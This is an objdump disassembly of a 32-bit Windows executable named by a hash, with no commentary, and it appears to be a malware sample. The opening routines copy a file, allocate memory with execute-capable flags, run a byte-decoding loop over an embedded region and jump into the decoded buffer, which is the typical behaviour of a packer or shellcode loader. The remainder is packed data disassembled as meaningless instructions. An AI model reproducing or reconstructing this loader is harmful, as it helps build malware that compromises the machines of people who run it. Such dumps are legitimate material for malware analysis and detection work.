
ab76f47afbb85e9ea295a3a9f6163aa811ec327d3b3d8d6c1cc682160bfcdb30.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x4291e8
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x4291e0
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429018
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429014
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429010
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x42902c
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x429040
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429044
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x42904c
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x42911c
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291a8
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x429180
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429150
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429128
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  edx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    eax,DWORD PTR [esp+0x10]
  4111a9:	mov    ecx,DWORD PTR [esp+0x14]
  4111ad:	add    eax,ecx
  4111af:	mov    DWORD PTR [esp+0x10],eax
  4111b3:	shr    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    ecx,eax
  4111bb:	shr    ecx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,ecx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	mov    ecx,DWORD PTR [esp+0x24]
  4111d6:	add    bl,dl
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x48],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x70],0x0
  41120b:	mov    DWORD PTR [ebp-0x60],0x0
  411212:	mov    DWORD PTR [ebp-0x8],0x0
  411219:	mov    DWORD PTR [ebp-0x6c],0x0
  411220:	mov    DWORD PTR [ebp-0x68],0x0
  411227:	mov    DWORD PTR [ebp-0x14],0x0
  41122e:	mov    DWORD PTR [ebp-0x4c],0x0
  411235:	mov    DWORD PTR [ebp-0x10],0x0
  41123c:	mov    DWORD PTR [ebp-0x58],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x5c],0x0
  411251:	mov    DWORD PTR [ebp-0x30],0x0
  411258:	mov    DWORD PTR [ebp-0x54],0x0
  41125f:	mov    DWORD PTR [ebp-0x2c],0x0
  411266:	mov    DWORD PTR [ebp-0x50],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x429214
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429218
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x42921c
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429220
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x429204
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429208
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x42920c
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429210
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x429212
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	lea    eax,[ebp-0x10]
  4112ce:	push   eax
  4112cf:	push   0x4291f0
  4112d4:	call   DWORD PTR ds:0x429008
  4112da:	test   eax,eax
  4112dc:	je     0x411338
  4112de:	lea    ecx,[ebp-0x40]
  4112e1:	push   ecx
  4112e2:	lea    edx,[ebp-0x10]
  4112e5:	push   edx
  4112e6:	call   DWORD PTR ds:0x429000
  4112ec:	test   eax,eax
  4112ee:	je     0x411338
  4112f0:	push   0x0
  4112f2:	push   0x0
  4112f4:	push   0x0
  4112f6:	call   DWORD PTR ds:0x429034
  4112fc:	mov    DWORD PTR [ebp-0x14],eax
  4112ff:	mov    eax,DWORD PTR [ebp-0x10]
  411302:	add    eax,0x1
  411305:	mov    DWORD PTR [ebp-0x10],eax
  411308:	push   0x14
  41130a:	push   0x0
  41130c:	mov    ecx,DWORD PTR [ebp-0x14]
  41130f:	push   ecx
  411310:	call   DWORD PTR ds:0x429030
  411316:	lea    edx,[ebp-0x50]
  411319:	push   edx
  41131a:	push   0x0
  41131c:	push   0x0
  41131e:	push   0x0
  411320:	mov    eax,DWORD PTR [ebp-0x50]
  411323:	push   eax
  411324:	call   DWORD PTR ds:0x429004
  41132a:	push   0x0
  41132c:	push   0x0
  41132e:	mov    ecx,DWORD PTR [ebp-0x14]
  411331:	push   ecx
  411332:	call   DWORD PTR ds:0x429048
  411338:	call   DWORD PTR ds:0x429028
  41133e:	mov    DWORD PTR [ebp-0x2c],eax
  411341:	movzx  edx,WORD PTR [ebp-0x2c]
  411345:	cmp    edx,0x539
  41134b:	jne    0x41137c
  41134d:	mov    DWORD PTR [ebp-0x14],0xe0d
  411354:	lea    eax,[ebp-0x28]
  411357:	push   eax
  411358:	call   DWORD PTR ds:0x429024
  41135e:	mov    DWORD PTR [ebp-0x60],eax
  411361:	mov    DWORD PTR [ebp-0x54],0x3a
  411368:	mov    BYTE PTR [ebp-0x34],0x0
  41136c:	mov    DWORD PTR [ebp-0x8],0xa8ceb317
  411373:	mov    DWORD PTR [ebp-0x68],0x10d93f
  41137a:	jmp    0x411391
  41137c:	mov    BYTE PTR ds:0x444a58,0x0
  411383:	mov    BYTE PTR ds:0x42cb88,0x0
  41138a:	mov    BYTE PTR ds:0x442b18,0x0
  411391:	mov    DWORD PTR [ebp-0x2c],0x410000
  411398:	push   DWORD PTR ds:0x429024
  41139e:	pop    edx
  41139f:	mov    DWORD PTR [ebp-0x6c],edx
  4113a2:	lea    ecx,[ebp-0x40]
  4113a5:	push   ecx
  4113a6:	mov    edx,DWORD PTR [ebp-0x60]
  4113a9:	push   edx
  4113aa:	call   DWORD PTR ds:0x429020
  4113b0:	mov    DWORD PTR [ebp-0x44],eax
  4113b3:	push   DWORD PTR [ebp-0x30]
  4113b6:	push   0x1000
  4113bb:	mov    eax,DWORD PTR [ebp-0x14]
  4113be:	add    eax,0x23
  4113c1:	add    eax,0x23
  4113c4:	push   eax
  4113c5:	xor    eax,eax
  4113c7:	push   eax
  4113c8:	mov    ecx,DWORD PTR [ebp-0x44]
  4113cb:	call   ecx
  4113cd:	push   eax
  4113ce:	pop    ecx
  4113cf:	mov    DWORD PTR [ebp-0x4],ecx
  4113d2:	mov    eax,DWORD PTR [ebp-0x68]
  4113d5:	sub    eax,0xdae0b
  4113da:	mov    DWORD PTR [ebp-0x68],eax
  4113dd:	cmp    DWORD PTR [ebp-0x4],0x0
  4113e1:	jne    0x4113ea
  4113e3:	mov    BYTE PTR ds:0x442b18,0x0
  4113ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ed:	add    ecx,DWORD PTR [ebp-0x14]
  4113f0:	mov    edx,DWORD PTR [ebp-0x8]
  4113f3:	mov    DWORD PTR [ecx],edx
  4113f5:	mov    eax,DWORD PTR [ebp-0x4]
  4113f8:	add    eax,DWORD PTR [ebp-0x54]
  4113fb:	mov    DWORD PTR [ebp-0x5c],eax
  4113fe:	mov    ecx,DWORD PTR ds:0x429020
  411404:	mov    DWORD PTR [ebp-0x4c],ecx
  411407:	mov    edx,DWORD PTR [ebp-0x4]
  41140a:	add    edx,DWORD PTR [ebp-0x14]
  41140d:	mov    eax,DWORD PTR [ebp+0x8]
  411410:	mov    DWORD PTR [edx+0x4],eax
  411413:	mov    ecx,DWORD PTR [ebp-0x4]
  411416:	add    ecx,DWORD PTR [ebp-0x14]
  411419:	mov    DWORD PTR [ebp-0xc],ecx
  41141c:	cmp    DWORD PTR [ebp-0x68],0x0
  411420:	jbe    0x41143d
  411422:	mov    edx,DWORD PTR [ebp-0xc]
  411425:	push   edx
  411426:	mov    eax,DWORD PTR [ebp-0x14]
  411429:	push   eax
  41142a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41142d:	add    ecx,DWORD PTR [ebp-0x68]
  411430:	push   ecx
  411431:	mov    edx,DWORD PTR [ebp-0x4]
  411434:	push   edx
  411435:	call   0x411170
  41143a:	add    esp,0x10
  41143d:	cmp    DWORD PTR [ebp-0x5c],0x0
  411441:	je     0x411454
  411443:	push   DWORD PTR [ebp-0x4c]
  411446:	push   DWORD PTR [ebp-0x6c]
  411449:	mov    edx,DWORD PTR [ebp-0x5c]
  41144c:	push   eax
  41144d:	jmp    edx
  41144f:	jmp    0x422f29
  411454:	mov    eax,DWORD PTR [ebp+0x8]
  411457:	mov    DWORD PTR [ebp-0x18],eax
  41145a:	push   es
  41145b:	call   0xd872:0xe2f347e1
  411462:	dec    edx
  411463:	call   0xe852:0x81c7b456
  41146a:	mov    esp,0x438a98a2
  41146f:	pusha  
  411470:	nop
  411471:	mov    dh,0xbf
  411473:	inc    edx
  411474:	sbb    dl,BYTE PTR [edx+esi*1]
  411477:	xor    ebx,DWORD PTR [edx+0x59]
  41147a:	xchg   edi,eax
  41147b:	sbb    DWORD PTR [eax],0x35
  41147e:	xor    ch,BYTE PTR [esi]
  411480:	mov    ebp,0x901b65c5
  411485:	pop    esi
  411486:	push   cs
  411487:	lock test BYTE PTR [edi+0x45],ah
  41148b:	sbb    ebx,esp
  41148d:	out    0x31,eax
  41148f:	cmp    BYTE PTR [eax-0x21],dl
  411492:	pop    esp
  411493:	clc    
  411494:	sub    DWORD PTR [esi],esi
  411496:	(bad)  
  411497:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411498:	sub    eax,0xf8396242
  41149d:	add    edi,esp
  41149f:	lods   eax,DWORD PTR ds:[esi]
  4114a0:	pop    ds
  4114a1:	mov    dh,0x34
  4114a3:	cwde   
  4114a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114a5:	cmp    ebp,DWORD PTR [edi+0x5290ad98]
  4114ab:	add    DWORD PTR [ebx+0x11],edx
  4114ae:	daa    
  4114af:	test   dl,dl
  4114b1:	imul   esi,DWORD PTR [edi+0x501a4e42],0x671c5c89
  4114bb:	ds xchg esp,eax
  4114bd:	cwde   
  4114be:	dec    ebx
  4114bf:	xor    esp,edi
  4114c1:	sbb    BYTE PTR [esi-0x6ef44633],dl
  4114c7:	es inc esp
  4114c9:	ret    
  4114ca:	or     BYTE PTR [esi-0x50],0x41
  4114ce:	jae    0x41147c
  4114d0:	test   DWORD PTR [ecx+ebp*4-0x2d],0x24dfb9b1
  4114d8:	mov    edi,0x8938a57a
  4114dd:	cmp    al,0x55
  4114df:	call   0xbbc58f40
  4114e4:	add    BYTE PTR [edx-0x19],ch
  4114e7:	xchg   edi,eax
  4114e8:	neg    DWORD PTR [ebp+0x6d]
  4114eb:	icebp  
  4114ec:	adc    cl,BYTE PTR [edi-0x16]
  4114ef:	call   0x5f7b:0x470c5ad3
  4114f6:	(bad)  
  4114f7:	push   esp
  4114f8:	div    esi
  4114fa:	jne    0x411526
  4114fc:	mov    ds:0x4c8b8045,eax
  411501:	lods   eax,DWORD PTR ds:[esi]
  411502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411503:	xchg   ebx,eax
  411504:	mov    ebx,0xf2fad4a
  411509:	(bad)  
  41150a:	ins    DWORD PTR es:[edi],dx
  41150b:	outs   dx,DWORD PTR ds:[esi]
  41150c:	jp     0x411579
  41150e:	cmc    
  41150f:	sub    BYTE PTR [eax],ah
  411511:	pop    edi
  411512:	sbb    ebp,DWORD PTR [ebx]
  411514:	(bad)  
  411515:	xchg   ebx,eax
  411516:	cld    
  411517:	call   0x5dc5:0xc14236a4
  41151e:	rcr    ecx,cl
  411520:	mov    BYTE PTR [esi+esi*1],0x91
  411524:	jb     0x4114ef
  411526:	xchg   esi,eax
  411527:	shl    DWORD PTR [eax+0x14],cl
  41152a:	ja     0x411519
  41152c:	xor    DWORD PTR [edx-0x4fd0a238],ecx
  411532:	cmp    cl,BYTE PTR [ecx+eiz*2+0x1ecb5d27]
  411539:	and    DWORD PTR [edi+0x6837a3b4],esp
  41153f:	sbb    ch,ah
  411541:	cwde   
  411542:	les    edi,FWORD PTR [ebp-0x3b]
  411545:	cdq    
  411546:	mov    esp,0xf4556ac5
  41154b:	push   edi
  41154c:	adc    al,0x77
  41154e:	dec    edi
  41154f:	rcl    BYTE PTR [esi-0x16],1
  411552:	inc    ebx
  411553:	shl    DWORD PTR [edi+0x442a4d83],0x9c
  41155a:	sub    al,0x96
  41155c:	lods   al,BYTE PTR ds:[esi]
  41155d:	mov    edx,0xe16f222a
  411562:	pop    ebx
  411563:	(bad)  
  411564:	rcr    bh,1
  411566:	das    
  411567:	push   esp
  411568:	aas    
  411569:	fs pop edi
  41156b:	mov    ds:0x8c9a1f2e,al
  411570:	ror    DWORD PTR [eax],1
  411572:	mov    BYTE PTR [ecx],dl
  411574:	inc    eax
  411575:	shl    BYTE PTR ds:0xede6657,1
  41157b:	or     eax,0xca64f3b6
  411580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411581:	mov    ebp,0x7ce71cd6
  411586:	das    
  411587:	and    al,BYTE PTR [esi+0x371f6fa3]
  41158d:	imul   esp,edx,0xffffff8b
  411590:	and    ebx,DWORD PTR [ecx]
  411592:	out    dx,al
  411593:	sub    DWORD PTR [edi-0x1c],0x41b772e1
  41159a:	xchg   esp,eax
  41159b:	inc    eax
  41159c:	out    0x1,eax
  41159e:	int    0x98
  4115a0:	jge    0x411546
  4115a2:	sbb    dh,BYTE PTR [eax+0x8]
  4115a5:	fsubrp st(5),st
  4115a7:	je     0x411551
  4115a9:	cmp    eax,DWORD PTR [edx-0x7c10699c]
  4115af:	mov    bh,0x71
  4115b1:	xchg   ecx,edi
  4115b3:	mov    ch,0x1e
  4115b5:	jae    0x41160c
  4115b7:	lea    eax,[edi-0x65]
  4115ba:	adc    DWORD PTR [ebp+0x76832efa],edx
  4115c0:	adc    al,0x43
  4115c2:	popa   
  4115c3:	push   esp
  4115c4:	or     edx,eax
  4115c6:	and    DWORD PTR [eax],ebx
  4115c8:	pop    ds
  4115c9:	enter  0xfd75,0x8
  4115cd:	clc    
  4115ce:	and    al,0x49
  4115d0:	mov    esp,0x5c75b9bc
  4115d5:	pextrw eax,(bad),0xc5
  4115d7:	push   es
  4115d8:	pop    ebp
  4115d9:	cld    
  4115da:	mov    bl,0x7b
  4115dc:	lahf   
  4115dd:	xchg   ecx,eax
  4115de:	mov    dl,0x54
  4115e0:	push   ss
  4115e1:	push   esi
  4115e2:	cdq    
  4115e3:	xor    ebp,DWORD PTR [edi+0x16eb3dc2]
  4115e9:	(bad)  
  4115ea:	lods   al,BYTE PTR ds:[esi]
  4115eb:	dec    ecx
  4115ec:	mov    ecx,0x5eaf305d
  4115f1:	aaa    
  4115f2:	push   ecx
  4115f3:	xchg   esi,eax
  4115f4:	fisub  WORD PTR [ebp-0x18]
  4115f7:	mov    BYTE PTR [edi*4+0x62cd6045],ch
  4115fe:	xchg   esi,eax
  4115ff:	mov    ebx,0xc40ac454
  411604:	xor    eax,0x4bc86c11
  411609:	mov    al,bl
  41160b:	xchg   ebp,eax
  41160c:	test   BYTE PTR [ebx+0x11],0x82
  411610:	push   0xaea55c6e
  411615:	loope  0x41164e
  411617:	jmp    0x41166e
  411619:	fst    st(3)
  41161b:	rcl    DWORD PTR [edi+0x9],0x12
  41161f:	sbb    esi,esp
  411621:	retf   
  411622:	out    0xa1,eax
  411624:	ds out dx,al
  411626:	mov    bl,0xf3
  411628:	sub    al,0x77
  41162a:	cmp    al,0x62
  41162c:	xchg   ecx,eax
  41162d:	adc    edx,ebp
  41162f:	add    edi,eax
  411631:	dec    edi
  411632:	adc    DWORD PTR [eax+ebp*2+0x3b],eax
  411636:	mov    ecx,0xa3f54191
  41163b:	xchg   ebx,eax
  41163c:	rol    ah,1
  41163e:	mov    edi,0xd26bb7a5
  411643:	ficomp WORD PTR [eax]
  411645:	add    ecx,DWORD PTR [edi-0x3b]
  411648:	pop    ss
  411649:	sub    al,0x3b
  41164b:	popa   
  41164c:	add    ch,BYTE PTR [edi-0x648e85af]
  411652:	mov    BYTE PTR [edx],al
  411654:	xchg   esp,eax
  411655:	sar    BYTE PTR [ecx],cl
  411657:	cs xchg ebp,eax
  411659:	jnp    0x503aa82e
  41165f:	repnz mov cl,0xde
  411662:	mov    ecx,DWORD PTR [ebx-0x19f9ea5f]
  411668:	in     al,dx
  411669:	es nop
  41166b:	test   BYTE PTR [edx],al
  41166d:	pop    esp
  41166e:	and    al,0xb9
  411670:	inc    edi
  411671:	bound  ebp,QWORD PTR [eax+0x0]
  411674:	mov    ch,0x73
  411676:	imul   ecx,DWORD PTR [edi+0x671fecf7],0x6f27e496
  411680:	push   eax
  411681:	adc    edx,DWORD PTR [eax+0x3c01bfad]
  411687:	pop    esp
  411688:	(bad)  
  411689:	push   cs
  41168a:	inc    edx
  41168b:	jp     0x41166f
  41168d:	mov    ah,0x37
  41168f:	cld    
  411690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411691:	out    0x6e,eax
  411693:	enter  0x4297,0x58
  411697:	and    dh,BYTE PTR [edx]
  411699:	jmp    0x4116b2
  41169b:	test   DWORD PTR [ebx+0x18],ebx
  41169e:	mov    al,bl
  4116a0:	cmp    edi,DWORD PTR [edi]
  4116a2:	je     0x411627
  4116a4:	arpl   bp,ax
  4116a6:	and    ebx,esp
  4116a8:	jne    0x41169e
  4116aa:	(bad)  
  4116ab:	shl    BYTE PTR [ebx],cl
  4116ad:	cs mov ah,0xa
  4116b0:	je     0x4116db
  4116b2:	push   es
  4116b3:	push   ecx
  4116b4:	mov    eax,ds:0xef488193
  4116b9:	xor    ecx,DWORD PTR [eax+0x5ab50a1d]
  4116bf:	mov    esi,0x704cc485
  4116c4:	sub    DWORD PTR [ebx],esp
  4116c6:	popf   
  4116c7:	add    al,0x39
  4116c9:	xlat   BYTE PTR ds:[ebx]
  4116ca:	mov    dl,0x4c
  4116cc:	jl     0x411720
  4116ce:	sbb    BYTE PTR [ecx-0x43],ch
  4116d1:	and    al,0x12
  4116d3:	xchg   esi,esi
  4116d5:	sub    edi,DWORD PTR [ecx+ecx*1-0x7d1e513d]
  4116dc:	xor    al,0xa9
  4116de:	push   esi
  4116df:	jo     0x411703
  4116e1:	aad    0x1d
  4116e3:	sub    BYTE PTR [ebp-0x6],0xb9
  4116e7:	sahf   
  4116e8:	jb     0x4116a5
  4116ea:	or     al,0xa5
  4116ec:	xchg   edx,eax
  4116ed:	popa   
  4116ee:	les    eax,FWORD PTR [eax+0x6fe45249]
  4116f4:	mov    ebp,DWORD PTR [edx-0xf6761cb]
  4116fa:	and    edi,DWORD PTR [edi+0x4a]
  4116fd:	bound  ebp,QWORD PTR ds:[ecx-0x59]
  411701:	xchg   ebp,eax
  411702:	or     eax,DWORD PTR [edx]
  411704:	inc    ebp
  411705:	addr16 dec ebx
  411707:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411708:	cmp    al,0x91
  41170a:	push   0x29cb6181
  41170f:	popa   
  411710:	out    dx,eax
  411711:	jl     0x411771
  411713:	pusha  
  411714:	cmp    ebx,DWORD PTR [edx+edi*1+0x45]
  411718:	das    
  411719:	fadd   DWORD PTR [esi]
  41171b:	ss lock push ebx
  41171e:	mov    BYTE PTR [ebx-0x31378720],0x8e
  411725:	xchg   ebx,eax
  411726:	pushf  
  411727:	sbb    DWORD PTR ds:0xc35c2c34,edx
  41172d:	push   edi
  41172e:	mov    ecx,0xe2c7953a
  411733:	xchg   DWORD PTR ss:[ebx+esi*8+0x54],ebx
  411738:	ins    BYTE PTR es:[edi],dx
  411739:	mov    BYTE PTR [esi+0x1a],cl
  41173c:	adc    eax,0xe6c78057
  411741:	inc    ecx
  411742:	(bad)  
  411743:	ins    DWORD PTR es:[edi],dx
  411744:	xor    BYTE PTR [ecx+0x7fe54dda],dl
  41174a:	mov    ch,0xb3
  41174c:	mov    edi,0xdb4c6bfd
  411751:	les    edx,FWORD PTR [ebp+edx*8-0x2c]
  411755:	sbb    eax,0x48e87b32
  41175a:	mov    cs,WORD PTR [edi]
  41175c:	loop   0x411714
  41175e:	lds    esp,FWORD PTR [esi]
  411760:	mov    al,0x54
  411762:	add    BYTE PTR [esp+edx*1],dh
  411765:	sti    
  411766:	repnz in al,0x46
  411769:	stos   DWORD PTR es:[edi],eax
  41176a:	mov    edx,0xc998d55d
  41176f:	lahf   
  411770:	xor    edi,eax
  411772:	inc    edi
  411773:	push   ss
  411774:	les    ebp,FWORD PTR [eax+0x7a519f00]
  41177a:	dec    ebx
  41177b:	mov    edi,0x724e5a94
  411780:	ss and al,0x74
  411783:	pop    esp
  411784:	fistp  DWORD PTR [eax]
  411786:	retf   
  411787:	stos   BYTE PTR es:[edi],al
  411788:	loop   0x4117da
  41178a:	(bad)  [ebp+0x1244543d]
  411790:	dec    ebp
  411791:	imul   ebp,DWORD PTR ds:0x2230c0b0,0x48
  411798:	pop    eax
  411799:	sub    edx,esp
  41179b:	pusha  
  41179c:	push   eax
  41179d:	stos   DWORD PTR es:[edi],eax
  41179e:	mov    ch,0x34
  4117a0:	or     DWORD PTR [ebx],edi
  4117a2:	inc    ebx
  4117a3:	gs das 
  4117a5:	stos   BYTE PTR es:[edi],al
  4117a6:	test   BYTE PTR [esi+esi*2],cl
  4117a9:	imul   DWORD PTR [ecx-0x15]
  4117ac:	jmp    0x4117fc
  4117ae:	ret    0xba44
  4117b1:	and    al,0x56
  4117b3:	sti    
  4117b4:	sbb    BYTE PTR ds:0xb318ba02,bh
  4117ba:	div    al
  4117bc:	icebp  
  4117bd:	retf   
  4117be:	xchg   DWORD PTR [eax+edx*4+0x26],ecx
  4117c2:	inc    edx
  4117c3:	jge    0x411769
  4117c5:	adc    al,0x93
  4117c7:	cdq    
  4117c8:	std    
  4117c9:	int3   
  4117ca:	cmp    ebp,esp
  4117cc:	mov    ds:0xb6184f4e,al
  4117d1:	mov    ebx,0xaa7b64d9
  4117d6:	sub    ebp,DWORD PTR [edx+0x34]
  4117d9:	leave  
  4117da:	cmc    
  4117db:	dec    esp
  4117dc:	inc    ecx
  4117dd:	mov    eax,ds:0xe0102f68
  4117e2:	imul   edi,DWORD PTR [esi+0x42],0x5e30158f
  4117e9:	xor    BYTE PTR [esi-0x2b],0x49
  4117ed:	add    esi,DWORD PTR [edx]
  4117ef:	out    0x3b,eax
  4117f1:	(bad)  
  4117f2:	mov    esp,0x717a1af4
  4117f7:	js     0x411827
  4117f9:	sub    ebp,0x3d
  4117fc:	test   edx,esp
  4117fe:	cmp    esp,DWORD PTR [ecx]
  411800:	int3   
  411801:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411802:	mov    al,0x9f
  411804:	in     al,dx
  411805:	jl     0x4117f8
  411807:	add    al,0x7
  411809:	in     eax,0xe8
  41180b:	pop    edx
  41180c:	ja     0x4117fb
  41180e:	popf   
  41180f:	stc    
  411810:	pop    ebx
  411811:	int    0xce
  411813:	cmp    DWORD PTR [edx+0x251fd0bb],ebx
  411819:	out    0x82,eax
  41181b:	xor    esi,DWORD PTR [esi+0x25]
  41181e:	sbb    dl,BYTE PTR [ecx-0x3d]
  411821:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411822:	adc    BYTE PTR [edx],0x2a
  411825:	fdecstp 
  411827:	mov    al,0x1f
  411829:	fs popf 
  41182b:	push   esi
  41182c:	mov    ecx,0xa0feccaa
  411831:	mov    ecx,0xf77d634d
  411836:	add    bh,BYTE PTR [ecx+0x654f483b]
  41183c:	add    DWORD PTR [ecx-0x2a],ebx
  41183f:	stos   BYTE PTR es:[edi],al
  411840:	mov    esp,es
  411842:	stos   BYTE PTR es:[edi],al
  411843:	ss jmp 0x411889
  411846:	jg     0x411890
  411848:	pop    ss
  411849:	push   0x6d
  41184b:	mov    ecx,0x2544c9b4
  411850:	fld    DWORD PTR [ebx-0x434569db]
  411856:	xchg   ebx,eax
  411857:	cmp    ecx,DWORD PTR [ebp-0x45fd7932]
  41185d:	pop    esi
  41185e:	cmp    eax,0x4bf1a951
  411863:	or     al,0x24
  411865:	sub    edx,ecx
  411867:	push   esi
  411868:	push   es
  411869:	pop    ds
  41186a:	mov    eax,DWORD PTR [ebx]
  41186c:	lods   al,BYTE PTR ds:[esi]
  41186d:	test   BYTE PTR [edx+0x603eb657],bh
  411873:	sbb    al,0x3e
  411875:	xor    edi,ebx
  411877:	adc    al,0x40
  411879:	push   ds
  41187a:	arpl   WORD PTR [eax-0xf92613],ax
  411880:	div    BYTE PTR [edx+eax*2]
  411883:	add    DWORD PTR fs:0xfb81f9f0,edx
  41188a:	jecxz  0x4118d3
  41188c:	shr    dl,cl
  41188e:	stos   DWORD PTR es:[edi],eax
  41188f:	mov    cl,0x2f
  411891:	push   ss
  411892:	jnp    0x4118a0
  411894:	fwait
  411895:	cmp    esp,eax
  411897:	into   
  411898:	jne    0x4118be
